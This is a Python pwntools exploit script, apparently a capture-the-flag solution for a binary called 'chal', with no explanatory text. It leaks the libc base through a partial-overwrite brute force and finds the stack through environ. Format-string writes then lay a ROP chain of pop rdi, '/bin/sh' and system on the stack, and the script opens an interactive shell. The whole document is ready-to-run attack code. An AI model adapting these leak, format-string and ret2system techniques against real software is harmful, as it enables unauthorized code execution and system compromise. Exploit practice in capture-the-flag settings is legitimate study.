from pwn import *

context.binary = elf = ELF("./chal")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io = elf.process()

for i in range(0x35):
    io.sendafter(b": ", b"\0" * 0x80 + b"\xa8\x7f")

# 1/16 brute-force
leak = io.recvline()[:-1]
if len(leak) != 6:
    exit()
libc_base = u64(leak + b"\0\0") - libc.symbols["puts"]
log.info(f"libc base: {hex(libc_base)}")

io.sendafter(b": ", b"\0" * 0x88 + p64(libc_base + libc.symbols["environ"]))
argv = io.recvline()[:-1]
stack_ret = u64(argv + b"\0\0") - 0x130
stack_question = u64(argv + b"\0\0") - 0x248
log.info(f"stack_ret: {hex(stack_ret)}")


# fmtstr overwrite
# overwrite 1
offset = 0x90
rop = ROP(libc)
pop_rdi_gadget = libc_base + rop.rdi.address
ret_gadget = pop_rdi_gadget + 1
payload = fmtstr_payload(44, {stack_ret: ret_gadget}, write_size="short")
if len(payload) > offset:
    exit()
payload = payload.ljust(offset, b"\0")
io.sendafter(b": ", payload + p64(stack_question))

# overwrite 2
offset = offset + 8
payload = fmtstr_payload(44, {stack_ret + 8: pop_rdi_gadget}, write_size="short")
if len(payload) > offset:
    exit()
payload = payload.ljust(offset, b"\0")
io.sendafter(b": ", payload + p64(stack_question))

# overwrite 3
offset = offset + 8
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
payload = fmtstr_payload(44, {stack_ret + 16: binsh_addr}, write_size="short")
if len(payload) > offset:
    exit()
payload = payload.ljust(offset, b"\0")
io.sendafter(b": ", payload + p64(stack_question))

# overwrite 4
offset = offset + 8
system_addr = libc_base + libc.symbols["system"]
payload = fmtstr_payload(44, {stack_ret + 24: system_addr}, write_size="short")
if len(payload) > offset:
    exit()
payload = payload.ljust(offset, b"\0")
io.sendafter(b": ", payload + p64(stack_question))

offset = offset + 8
io.sendafter(b": ", b"EXIT" + b"\0" * offset)

log.info("===SHELL===")

io.interactive()
